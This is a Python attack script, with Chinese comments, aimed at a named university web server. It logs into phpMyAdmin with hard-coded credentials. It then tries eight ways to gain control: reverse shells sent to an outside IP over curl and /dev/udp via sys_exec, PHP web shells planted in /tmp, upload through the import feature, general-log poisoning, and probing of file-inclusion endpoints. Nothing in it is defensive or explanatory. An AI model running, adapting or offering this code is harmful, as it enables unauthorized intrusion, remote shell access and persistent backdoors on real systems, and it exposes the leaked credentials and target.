#!/usr/bin/env python3
import requests
import re
import urllib3
import time
import base64
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://olympic.su.ac.th/phpmyadmin/"
session = requests.Session()
session.verify = False

login_data = {"pma_username": "mysql", "pma_password": "Mu123.123.", "server": "1"}
resp = session.post(url + "index.php", data=login_data, allow_redirects=True)
token = re.search(r'token=([a-f0-9]+)', resp.text).group(1)

LHOST = "82.29.71.156"
LPORT = "4444"

print(f"[+] Token: {token}")

# 方法1: HTTP反向shell
print("\n[*] 方法1: HTTP反向shell...")
http_shell = f"curl -X POST http://{LHOST}:{LPORT} --data-binary @- < <(bash -i 2>&1)"
sql = f"SELECT sys_exec('{http_shell}');"
sql_data = {"sql_query": sql, "db": "mysql"}
session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False, timeout=1)

# 方法2: DNS反向shell
print("[*] 方法2: DNS反向shell...")
dns_shell = f"bash -i >& /dev/udp/{LHOST}/53 0>&1"
sql = f"SELECT sys_exec('{dns_shell}');"
sql_data = {"sql_query": sql, "db": "mysql"}
session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False, timeout=1)

# 方法3: 写入/tmp并通过文件包含
print("[*] 方法3: 写入/tmp并通过文件包含...")
shell_code = "<?php system($_GET['c']); ?>"
cmd = f"echo '{shell_code}' > /tmp/shell.php"
sql = f"SELECT sys_exec('{cmd}');"
sql_data = {"sql_query": sql, "db": "mysql"}
session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)

# 尝试文件包含
include_urls = [
    f"https://olympic.su.ac.th/enmeeting/addmeeting.php?file=/tmp/shell.php&c=id",
    f"https://olympic.su.ac.th/enmeeting/mobilemeeting.php?file=/tmp/shell.php&c=id",
    f"https://olympic.su.ac.th/enmeeting/J4P.php?file=/tmp/shell.php&c=id",
]

for inc_url in include_urls:
    resp = requests.get(inc_url, verify=False, timeout=5)
    if "uid=" in resp.text:
        print(f"[+] 文件包含成功: {inc_url}")
        break

# 方法4: phpMyAdmin导入功能上传shell
print("[*] 方法4: phpMyAdmin导入功能...")
shell_content = "<?php system($_GET['c']); ?>"
files = {"import_file": ("shell.php", shell_content, "application/x-php")}
data = {"format": "custom", "token": token, "db": "scmeeting"}
import_resp = session.post(url + "db_import.php", params={"token": token, "db": "scmeeting"}, files=files, data=data, verify=False, timeout=10)

# 方法5: 数据库日志写入到可包含位置
print("[*] 方法5: 数据库日志到可包含位置...")
log_path = "/tmp/general.log"
sql = f"SET GLOBAL general_log_file = '{log_path}';"
sql_data = {"sql_query": sql, "db": "mysql"}
session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)

sql = "SET GLOBAL general_log = 'ON';"
sql_data = {"sql_query": sql, "db": "mysql"}
session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)

sql = "SELECT '<?php system($_GET[c]); ?>';"
sql_data = {"sql_query": sql, "db": "mysql"}
session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)

sql = "SET GLOBAL general_log = 'OFF';"
sql_data = {"sql_query": sql, "db": "mysql"}
session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)

# 尝试包含日志
log_include = f"https://olympic.su.ac.th/enmeeting/addmeeting.php?file={log_path}&c=id"
resp = requests.get(log_include, verify=False, timeout=5)
if "uid=" in resp.text:
    print(f"[+] 日志包含成功: {log_include}")

# 方法6: 写入到phpMyAdmin临时目录
print("[*] 方法6: 写入到phpMyAdmin临时目录...")
pma_dirs = [
    "/tmp/phpMyAdmin/shell.php",
    "/var/tmp/phpMyAdmin/shell.php",
    "/tmp/shell.php",
]

for pma_dir in pma_dirs:
    cmd = f"mkdir -p $(dirname {pma_dir}) && echo '{shell_code}' > {pma_dir}"
    sql = f"SELECT sys_exec('{cmd}');"
    sql_data = {"sql_query": sql, "db": "mysql"}
    session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)

# 方法7: 利用phpMyAdmin的导出功能
print("[*] 方法7: phpMyAdmin导出功能...")
sql = "CREATE TABLE IF NOT EXISTS scmeeting.s(code TEXT); INSERT INTO scmeeting.s VALUES('<?php system($_GET[c]); ?>');"
sql_data = {"sql_query": sql, "db": "scmeeting"}
session.post(url + "db_sql.php", params={"token": token, "db": "scmeeting"}, data=sql_data, verify=False)

# 方法8: 通过phpMyAdmin的配置文件
print("[*] 方法8: phpMyAdmin配置文件...")
config_path = "/tmp/config.inc.php"
cmd = f"echo '<?php system(\$_GET[c]); ?>' > {config_path}"
sql = f"SELECT sys_exec('{cmd}');"
sql_data = {"sql_query": sql, "db": "mysql"}
session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)

print("\n[+] 所有方法尝试完成")
